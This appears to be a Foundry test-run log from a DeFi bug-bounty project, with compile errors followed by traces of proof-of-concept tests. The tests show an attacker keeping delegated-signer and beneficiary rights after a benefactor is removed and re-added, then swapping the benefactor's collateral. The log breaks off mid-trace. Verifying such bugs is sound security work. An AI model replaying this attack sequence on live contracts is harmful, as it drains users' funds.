@@ -1,0 +1,313 @@
+Unable to resolve imports:
+      "../../src/oracle/IOracleFeed.sol" in "/home/z/fkr-step1/defi-bounty/foundry_test/test/MockOracleFeed.sol"
+with remappings:
+      @openzeppelin/contracts/=/home/z/fkr-step1/defi-bounty/foundry_test/lib/openzeppelin-contracts/contracts/
+      lib/openzeppelin-contracts/:forge-std/=/home/z/fkr-step1/defi-bounty/foundry_test/lib/openzeppelin-contracts/lib/forge-std/src/
+      /home/z/fkr-step1/defi-bounty/foundry_test/lib/openzeppelin-contracts/:forge-std/=/home/z/fkr-step1/defi-bounty/foundry_test/lib/openzeppelin-contracts/lib/forge-std/src/
+      ds-test/=/home/z/fkr-step1/defi-bounty/foundry_test/lib/openzeppelin-contracts/lib/forge-std/lib/ds-test/src/
+      erc4626-tests/=/home/z/fkr-step1/defi-bounty/foundry_test/lib/openzeppelin-contracts/lib/erc4626-tests/
+      forge-std/=/home/z/fkr-step1/defi-bounty/foundry_test/lib/forge-std/src/
+      openzeppelin-contracts/=/home/z/fkr-step1/defi-bounty/foundry_test/lib/openzeppelin-contracts/
+Compiling 45 files with Solc 0.8.30
+Solc 0.8.30 finished in 7.99s
+Compiler run successful!
+error: file ../../src/oracle/IOracleFeed.sol not found
+  ╭▸ test/MockOracleFeed.sol:4:27
+  │
+4 │ import {IOracleFeed} from "../../src/oracle/IOracleFeed.sol";
+  ╰╴                          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+error: unresolved symbol `IOracleFeed`
+  ╭▸ test/MockOracleFeed.sol:7:28
+  │
+7 │ contract MockOracleFeed is IOracleFeed {
+  ╰╴                           ━━━━━━━━━━━
+
+error: unresolved symbol `OraclePrice`
+   ╭▸ test/MockOracleFeed.sol:22:14
+   │
+22 │         emit OraclePrice(price);
+   ╰╴             ━━━━━━━━━━━
+
+
+Ran 2 tests for test/IndependentVerifyTest.t.sol:IndependentVerifyTest
+[PASS] test_BugIsReal_AttackerDrainsAfterRemoveAndReAdd() (gas: 685241)
+Traces:
+  [706841] IndependentVerifyTest::test_BugIsReal_AttackerDrainsAfterRemoveAndReAdd()
+    ├─ [0] VM::prank(benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   └─ ← [Return]
+    ├─ [51188] PSM::setDelegatedSigner(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   ├─ emit DelegatedSignerAdded(signer: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [36019] PSM::confirmDelegatedSigner(benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   ├─ emit DelegatedSignerConfirmed(signer: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   └─ ← [Return]
+    ├─ [52402] PSM::setApprovedBeneficiary(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], true)
+    │   ├─ emit BeneficiaryApproved(benefactor: benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023], beneficiary: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   └─ ← [Return]
+    ├─ [46257] MockERC20::approve(PSM: [0x32850cAd1e9170614704fF8BA37a25e498e1B832], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023], spender: PSM: [0x32850cAd1e9170614704fF8BA37a25e498e1B832], amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [0] VM::prank(admin: [0xaA10a84CE7d9AE517a52c6d5cA153b369Af99ecF])
+    │   └─ ← [Return]
+    ├─ [41017] PSM::removeBenefactor(benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   ├─ emit BenefactorRemoved(benefactor: benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(admin: [0xaA10a84CE7d9AE517a52c6d5cA153b369Af99ecF])
+    │   └─ ← [Return]
+    ├─ [66948] PSM::addBenefactor(benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   ├─ emit BenefactorAdded(benefactor: benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023])
+    │   └─ ← [Stop]
+    ├─ [2538] MockERC20::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2538] MockERC20::balanceOf(benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023]) [staticcall]
+    │   └─ ← [Return] 100000000000 [1e11]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [344924] PSM::swap(Order({ isSwapForAsset: true, expiry: 3601, nonce: 1, chainId: 31337 [3.133e4], benefactor: 0x9d60e89736DEE803574795B2f3607e0eD3ea2023, beneficiary: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, collateral: 0x6D9da78B6A5BEdcA287AA5d49613bA36b90c15C4, amountIn: 5000000000 [5e9], minAmountOut: 4900000000000000000000 [4.9e21] }))
+    │   ├─ [5422] MockOracleFeed::getPrice()
+    │   │   ├─ emit OraclePrice(price: 1000000000000000000 [1e18])
+    │   │   └─ ← [Return] 1000000000000000000 [1e18], 1
+    │   ├─ emit OraclePriceValidated(collateral: MockERC20: [0x6D9da78B6A5BEdcA287AA5d49613bA36b90c15C4], price: 1000000000000000000 [1e18])
+    │   ├─ [32062] MockERC20::transferFrom(benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023], custodianRecv: [0xf99baf67b61af0dB738B4F01e27D489c0fCd26e8], 5000000000 [5e9])
+    │   │   ├─ emit Transfer(from: benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023], to: custodianRecv: [0xf99baf67b61af0dB738B4F01e27D489c0fCd26e8], amount: 5000000000 [5e9])
+    │   │   └─ ← [Return] true
+    │   ├─ [32062] MockERC20::transferFrom(custodianSend: [0xa3355075C773C778fbe618F41E56705eACd299Cd], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 5000000000000000000000 [5e21])
+    │   │   ├─ emit Transfer(from: custodianSend: [0xa3355075C773C778fbe618F41E56705eACd299Cd], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 5000000000000000000000 [5e21])
+    │   │   └─ ← [Return] true
+    │   ├─ emit SwapExecuted(orderExecutor: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023], beneficiary: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], order: Order({ isSwapForAsset: true, expiry: 3601, nonce: 1, chainId: 31337 [3.133e4], benefactor: 0x9d60e89736DEE803574795B2f3607e0eD3ea2023, beneficiary: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, collateral: 0x6D9da78B6A5BEdcA287AA5d49613bA36b90c15C4, amountIn: 5000000000 [5e9], minAmountOut: 4900000000000000000000 [4.9e21] }), amountOut: 5000000000000000000000 [5e21], feeAmount: 0)
+    │   └─ ← [Stop]
+    ├─ [2538] MockERC20::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 5000000000000000000000 [5e21]
+    ├─ [2538] MockERC20::balanceOf(benefactor: [0x9d60e89736DEE803574795B2f3607e0eD3ea2023]) [staticcall]
+    │   └─ ← [Return] 95000000000 [9.5e10]
+    └─ ← [Return]
+
+[PASS] test_Sanity_FreshBenefactorBlocks() (gas: 213567)
+Traces:
+  [216367] IndependentVerifyTest::test_Sanity_FreshBenefactorBlocks()
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] fresh: [0x35bde469FC29B59Be7C543017fAa497234E9e402]
+    ├─ [0] VM::label(fresh: [0x35bde469FC29B59Be7C543017fAa497234E9e402], "fresh")
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(admin: [0xaA10a84CE7d9AE517a52c6d5cA153b369Af99ecF])
+    │   └─ ← [Return]
+    ├─ [66948] PSM::addBenefactor(fresh: [0x35bde469FC29B59Be7C543017fAa497234E9e402])
+    │   ├─ emit BenefactorAdded(benefactor: fresh: [0x35bde469FC29B59Be7C543017fAa497234E9e402])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(fresh: [0x35bde469FC29B59Be7C543017fAa497234E9e402])
+    │   └─ ← [Return]
+    ├─ [46257] MockERC20::approve(PSM: [0x32850cAd1e9170614704fF8BA37a25e498e1B832], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: fresh: [0x35bde469FC29B59Be7C543017fAa497234E9e402], spender: PSM: [0x32850cAd1e9170614704fF8BA37a25e498e1B832], amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [49240] MockERC20::mint(fresh: [0x35bde469FC29B59Be7C543017fAa497234E9e402], 10000000000 [1e10])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xf4844814)
+    │   └─ ← [Return]
+    ├─ [31262] PSM::swap(Order({ isSwapForAsset: true, expiry: 3601, nonce: 1, chainId: 31337 [3.133e4], benefactor: 0x35bde469FC29B59Be7C543017fAa497234E9e402, beneficiary: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, collateral: 0x6D9da78B6A5BEdcA287AA5d49613bA36b90c15C4, amountIn: 1000000000 [1e9], minAmountOut: 0 }))
+    │   └─ ← [Revert] InvalidAssetAmount(0)
+    └─ ← [Return]
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.58ms (411.69µs CPU time)
+
+Ran 4 tests for test/PoC_removeBenefactor.t.sol:PoC_removeBenefactor
+[PASS] test_RemoveBenefactor_AttackerCanSwapAfterReAdd() (gas: 869850)
+Logs:
+  attacker asset gain: 1000.000000000000000000
+  benefactorA collateral loss: 1000.000000000000000000
+
+Traces:
+  [894250] PoC_removeBenefactor::test_RemoveBenefactor_AttackerCanSwapAfterReAdd()
+    ├─ [0] VM::startPrank(benefactorManager: [0x3B16C79d99F9f0077543E7F3369883B4E1c91701])
+    │   └─ ← [Return]
+    ├─ [66948] PSM::addBenefactor(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit BenefactorAdded(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Return]
+    ├─ [51188] PSM::setDelegatedSigner(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   ├─ emit DelegatedSignerAdded(signer: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [36019] PSM::confirmDelegatedSigner(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit DelegatedSignerConfirmed(signer: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Return]
+    ├─ [52402] PSM::setApprovedBeneficiary(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], true)
+    │   ├─ emit BeneficiaryApproved(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], beneficiary: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Stop]
+    ├─ [2538] MockERC20::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2538] MockERC20::balanceOf(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] VM::prank(benefactorManager: [0x3B16C79d99F9f0077543E7F3369883B4E1c91701])
+    │   └─ ← [Return]
+    ├─ [41017] PSM::removeBenefactor(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit BenefactorRemoved(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [0] VM::warp(604801 [6.048e5])
+    │   └─ ← [Return]
+    ├─ [28838] MockOracleFeed::setPrice(1000000000000000000 [1e18], 604801 [6.048e5])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(benefactorManager: [0x3B16C79d99F9f0077543E7F3369883B4E1c91701])
+    │   └─ ← [Return]
+    ├─ [66948] PSM::addBenefactor(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit BenefactorAdded(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [466262] PSM::swap(Order({ isSwapForAsset: true, expiry: 608401 [6.084e5], nonce: 1, chainId: 31337 [3.133e4], benefactor: 0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56, beneficiary: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, collateral: 0x2e234DAe75C793f67A35089C9d99245E1C58470b, amountIn: 1000000000000000000000 [1e21], minAmountOut: 1000000000000000000000 [1e21] }))
+    │   ├─ [5422] MockOracleFeed::getPrice()
+    │   │   ├─ emit OraclePrice(price: 1000000000000000000 [1e18])
+    │   │   └─ ← [Return] 1000000000000000000 [1e18], 604801 [6.048e5]
+    │   ├─ emit OraclePriceValidated(collateral: MockERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], price: 1000000000000000000 [1e18])
+    │   ├─ [32062] MockERC20::transferFrom(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], collateralReceiveCustodian: [0x90DfBBC6b4c4daEf40B4DDb99c4d6d3727AbEA45], 1000000000000000000000 [1e21])
+    │   │   ├─ emit Transfer(from: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], to: collateralReceiveCustodian: [0x90DfBBC6b4c4daEf40B4DDb99c4d6d3727AbEA45], amount: 1000000000000000000000 [1e21])
+    │   │   └─ ← [Return] true
+    │   ├─ [32062] MockERC20::transferFrom(assetSendCustodian: [0x916447A36aCB6e866eE446c227423256154fC0EF], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1000000000000000000000 [1e21])
+    │   │   ├─ emit Transfer(from: assetSendCustodian: [0x916447A36aCB6e866eE446c227423256154fC0EF], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 1000000000000000000000 [1e21])
+    │   │   └─ ← [Return] true
+    │   ├─ emit SwapExecuted(orderExecutor: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], beneficiary: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], order: Order({ isSwapForAsset: true, expiry: 608401 [6.084e5], nonce: 1, chainId: 31337 [3.133e4], benefactor: 0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56, beneficiary: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, collateral: 0x2e234DAe75C793f67A35089C9d99245E1C58470b, amountIn: 1000000000000000000000 [1e21], minAmountOut: 1000000000000000000000 [1e21] }), amountOut: 1000000000000000000000 [1e21], feeAmount: 0)
+    │   └─ ← [Stop]
+    ├─ [2538] MockERC20::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [2538] MockERC20::balanceOf(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56]) [staticcall]
+    │   └─ ← [Return] 999000000000000000000000 [9.99e23]
+    ├─ emit log_named_decimal_uint(key: "attacker asset gain", val: 1000000000000000000000 [1e21], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "benefactorA collateral loss", val: 1000000000000000000000 [1e21], decimals: 18)
+    └─ ← [Return]
+
+[PASS] test_RemoveBenefactor_DelegatedSignerAndBeneficiaryPersist() (gas: 444454)
+Traces:
+  [466054] PoC_removeBenefactor::test_RemoveBenefactor_DelegatedSignerAndBeneficiaryPersist()
+    ├─ [0] VM::prank(benefactorManager: [0x3B16C79d99F9f0077543E7F3369883B4E1c91701])
+    │   └─ ← [Return]
+    ├─ [66948] PSM::addBenefactor(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit BenefactorAdded(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [8427] PSM::getBenefactorConfig(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56]) [staticcall]
+    │   └─ ← [Return] true, 0, 0, 0, 0
+    ├─ [0] VM::prank(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Return]
+    ├─ [51188] PSM::setDelegatedSigner(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   ├─ emit DelegatedSignerAdded(signer: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [3390] PSM::getDelegatedSignerStatus(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 1
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [36019] PSM::confirmDelegatedSigner(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit DelegatedSignerConfirmed(signer: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [3390] PSM::getDelegatedSignerStatus(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 2
+    ├─ [0] VM::prank(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Return]
+    ├─ [52402] PSM::setApprovedBeneficiary(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], true)
+    │   ├─ emit BeneficiaryApproved(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], beneficiary: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Stop]
+    ├─ [3520] PSM::isApprovedBeneficiary(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::prank(benefactorManager: [0x3B16C79d99F9f0077543E7F3369883B4E1c91701])
+    │   └─ ← [Return]
+    ├─ [41017] PSM::removeBenefactor(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit BenefactorRemoved(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [8427] PSM::getBenefactorConfig(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56]) [staticcall]
+    │   └─ ← [Return] false, 0, 0, 0, 0
+    ├─ [3390] PSM::getDelegatedSignerStatus(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 2
+    ├─ [3520] PSM::isApprovedBeneficiary(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::prank(benefactorManager: [0x3B16C79d99F9f0077543E7F3369883B4E1c91701])
+    │   └─ ← [Return]
+    ├─ [66948] PSM::addBenefactor(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit BenefactorAdded(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [8427] PSM::getBenefactorConfig(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56]) [staticcall]
+    │   └─ ← [Return] true, 0, 0, 0, 0
+    ├─ [3390] PSM::getDelegatedSignerStatus(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 2
+    ├─ [3520] PSM::isApprovedBeneficiary(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] true
+    └─ ← [Return]
+
+[PASS] test_Sanity_AttackerCanSwapBeforeRemove() (gas: 566255)
+Traces:
+  [580255] PoC_removeBenefactor::test_Sanity_AttackerCanSwapBeforeRemove()
+    ├─ [0] VM::startPrank(benefactorManager: [0x3B16C79d99F9f0077543E7F3369883B4E1c91701])
+    │   └─ ← [Return]
+    ├─ [66948] PSM::addBenefactor(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit BenefactorAdded(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Return]
+    ├─ [51188] PSM::setDelegatedSigner(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   ├─ emit DelegatedSignerAdded(signer: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [36019] PSM::confirmDelegatedSigner(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit DelegatedSignerConfirmed(signer: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Return]
+    ├─ [52402] PSM::setApprovedBeneficiary(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], true)
+    │   ├─ emit BeneficiaryApproved(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], beneficiary: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [344948] PSM::swap(Order({ isSwapForAsset: true, expiry: 3601, nonce: 1, chainId: 31337 [3.133e4], benefactor: 0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56, beneficiary: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, collateral: 0x2e234DAe75C793f67A35089C9d99245E1C58470b, amountIn: 1000000000000000000000 [1e21], minAmountOut: 1000000000000000000000 [1e21] }))
+    │   ├─ [5422] MockOracleFeed::getPrice()
+    │   │   ├─ emit OraclePrice(price: 1000000000000000000 [1e18])
+    │   │   └─ ← [Return] 1000000000000000000 [1e18], 1
+    │   ├─ emit OraclePriceValidated(collateral: MockERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], price: 1000000000000000000 [1e18])
+    │   ├─ [32062] MockERC20::transferFrom(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], collateralReceiveCustodian: [0x90DfBBC6b4c4daEf40B4DDb99c4d6d3727AbEA45], 1000000000000000000000 [1e21])
+    │   │   ├─ emit Transfer(from: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], to: collateralReceiveCustodian: [0x90DfBBC6b4c4daEf40B4DDb99c4d6d3727AbEA45], amount: 1000000000000000000000 [1e21])
+    │   │   └─ ← [Return] true
+    │   ├─ [32062] MockERC20::transferFrom(assetSendCustodian: [0x916447A36aCB6e866eE446c227423256154fC0EF], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1000000000000000000000 [1e21])
+    │   │   ├─ emit Transfer(from: assetSendCustodian: [0x916447A36aCB6e866eE446c227423256154fC0EF], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 1000000000000000000000 [1e21])
+    │   │   └─ ← [Return] true
+    │   ├─ emit SwapExecuted(orderExecutor: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56], beneficiary: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], order: Order({ isSwapForAsset: true, expiry: 3601, nonce: 1, chainId: 31337 [3.133e4], benefactor: 0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56, beneficiary: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, collateral: 0x2e234DAe75C793f67A35089C9d99245E1C58470b, amountIn: 1000000000000000000000 [1e21], minAmountOut: 1000000000000000000000 [1e21] }), amountOut: 1000000000000000000000 [1e21], feeAmount: 0)
+    │   └─ ← [Stop]
+    ├─ [2538] MockERC20::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    └─ ← [Return]
+
+[PASS] test_Sanity_FreshBenefactorBlocksUnknownAttacker() (gas: 150485)
+Traces:
+  [153285] PoC_removeBenefactor::test_Sanity_FreshBenefactorBlocksUnknownAttacker()
+    ├─ [0] VM::prank(benefactorManager: [0x3B16C79d99F9f0077543E7F3369883B4E1c91701])
+    │   └─ ← [Return]
+    ├─ [66948] PSM::addBenefactor(benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   ├─ emit BenefactorAdded(benefactor: benefactorA: [0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56])
+    │   └─ ← [Stop]
+    ├─ [0] VM::expectRevert(DelegationNotAuthorized(0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e))
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [66457] PSM::swap(Order({ isSwapForAsset: true, expiry: 3601, nonce: 1, chainId: 31337 [3.133e4], benefactor: 0x12942E57B5C0758bc0F9E196f7c44A50B7C46b56, beneficiary: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, collateral: 0x2e234DAe75C793f67A35089C9d99245E1C58470b, amountIn: 1000000000000000000000 [1e21], minAmountOut: 1000000000000000000000 [1e21] }))
+    │   ├─ [5422] MockOracleFeed::getPrice()
